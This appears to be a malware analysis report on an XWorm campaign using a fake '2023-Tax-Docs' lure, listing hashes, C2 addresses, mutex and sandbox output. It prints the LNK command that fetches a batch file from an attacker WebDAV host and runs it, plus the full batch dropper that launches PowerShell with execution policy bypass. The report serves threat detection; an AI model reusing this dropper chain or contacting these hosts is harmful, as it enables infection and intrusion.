THREAT IDENTIFICATION: XWORM 

ZIP FILE DOWNLOAD URL 
https://dl.dropboxusercontent.com/scl/fi/tmcvlcylbqug2gsg0oa3w/2023-Tax-Docs.zip?dl=0&rlkey=xzvl31kcjhjtrd3tf4z7u8u5n

ZIP FILE HASH
2023-Tax-Docs.zip
249af473bed98d945049c48382854855
SHA1: 9d867bf376a6c201ae6dc7e6b73755143febdff5

URL FILE HASH
2023-Tax-Docs.url
9134e411ab7b016119789f3bde875e08
SHA1: 233bf36e15243044e68a52a3717a2d4c60f2093f

URL FILE VALUE
file://reality-lauderdale-strengthen-condos.trycloudflare.com@SSL/DavWWWRoot/2023-Tax-Docs.lnk

OBSERVED TRAFFIC
https://reality-lauderdale-strengthen-condos.trycloudflare.com/2023-Tax-Docs.lnk

LNK FILE HASH
2023-Tax-Docs.lnk
666a208028b7a49e0f6615d977c5e9ac
SHA1: bd9613f957749721a03a24c52c578da27e1480dc

LNK FILE TARGET
C:\Windows\System32\cmd.exe /c  C:\Windows\System32\replace.exe \\reality-lauderdale-strengthen-condos.trycloudflare.com@SSL\DavWWWRoot\file.bat %USERPROFILE%\Pictures /A &  %USERPROFILE%\Pictures\file.bat

BATCH FILE HASH
file.bat
85bb69981a5650a562a6665ecd915bc0
SHA1: 8eb7672a3f867d11c7f99d73a8a094097ee12e22

CONTENTS OF file.bat
set destination=%USERPROFILE%\Pictures

echo Opening PDF file...
start "" "https://reality-lauderdale-strengthen-condos.trycloudflare.com/track.pdf"

REM Define PowerShell scripts to copy and execute
set "powershell_scripts=iz.ps1 quark.ps1 time.ps1"

REM Copy and execute each PowerShell script
for %%s in (%powershell_scripts%) do (
    echo Copying %%s from %source% to %destination%...
    copy /Y "%source%\%%s" "%destination%"
    IF NOT EXIST "%destination%\%%s" (
        echo Failed to copy %%s. Exiting script.
        exit /b 1
    ) ELSE (
        echo %%s copied successfully.
    )
    echo Running %%s with Bypass policy...
    powershell -ExecutionPolicy Bypass -File "%destination%\%%s"
    IF NOT "%ERRORLEVEL%"=="0" (
        echo %%s failed to execute. Exiting script.
        exit /b 1
    ) ELSE (
        echo %%s executed successfully.
    )
)
echo Closing the script after executing PowerShell scripts.
exit /b 0

DECOY DOCUMENT URL
https://reality-lauderdale-strengthen-condos.trycloudflare.com/track.pdf

POWERSHELL FILE HASHES
time.ps1
2bfa526ef33676990473ae6d8986623a
SHA1: 1842f235eb2f7a47db28080aea77b002090eb30e

quark.ps1
2dd79c1022129bbb3a832232306efc9b
SHA1: 63ed4b551a6e22a1a0ce16c2a742afbbdd1353a2

iz.ps1
683da518bf71777b7aa1339b9e1399eb
SHA1: 425455e7b11d81370db623ecabde6118969300f9

POWERSHELL SCRIPT OBFUSCATOR
# Obfuscated using https://github.com/DARKNOSY/Rush-PowerShell-Obfuscator, made by DARKN0$Y

INTERCEPTED POWERSHELL
powershell  -ExecutionPolicy Bypass -File "C:\Users\analyst\Pictures\iz.ps1"
powershell  -ExecutionPolicy Bypass -File "C:\Users\analyst\Pictures\quark.ps1"
powershell  -ExecutionPolicy Bypass -File "C:\Users\analyst\Pictures\time.ps1"

XWORM C2
91.92.243.33:7000
dcxwq1.duckdns.org:7000

STRINGS FROM MEMORY
XWorm V5.2

shutdown.exe /f /s /t 0
shutdown.exe /f /r /t 0
shutdown.exe -L

pong<Xwormmm>7
pong<Xwormmm>5
PING!<Xwormmm>samples<Xwormmm>0
pong<Xwormmm>8
PING!<Xwormmm>XWorm<Xwormmm>0
pong<Xwormmm>6

WEBDAV SERVER BEING USED
https://github.com/mar10/wsgidav/

MUTEX
Mutant, \Sessions\1\BaseNamedObjects\l3S37X5v6MhQ1Jg4

SCRIPT RESULTS 
Path not found - \\reality-lauderdale-strengthen-condos.trycloudflare.com@SSL\DavWWWRoot\file.bat
No files added
Opening PDF file...
Copying iz.ps1 from \\reality-lauderdale-strengthen-condos.trycloudflare.com@SSL\DavWWWRoot to C:\Users\analyst\Pictures...
The network name cannot be found.
iz.ps1 copied successfully.
Running iz.ps1 with Bypass policy...
[+] Launching a sacrificial process
    [*] Spoofed parent process: explorer.exe (PID: 2100)
    [*] Spawned process:        C:\Windows\System32\notepad.exe (PID: 5832)

[+] Injecting shellcode via Early Bird APC Queue
    [*] Memory allocated
        [-] Size:               65536 bytes
        [-] Address:            0x000001C107610000
        [-] Protection:         PAGE_READWRITE
    [*] Payload decrypted and written
        [-] Size:               62720 bytes
        [-] Address:            0x000001C107610000
    [*] Memory protection changed
        [-] Protection:         PAGE_EXECUTE_READ
    [*] APC queued
        [-] Thread ID:          5160
    [*] Thread resumed
    [*] Payload executed

[+] Closing opened handles
    [*] Process Handle:         0x0000000000000878
    [*] Thread Handle:          0x000000000000086C
iz.ps1 failed to execute. Exiting script.

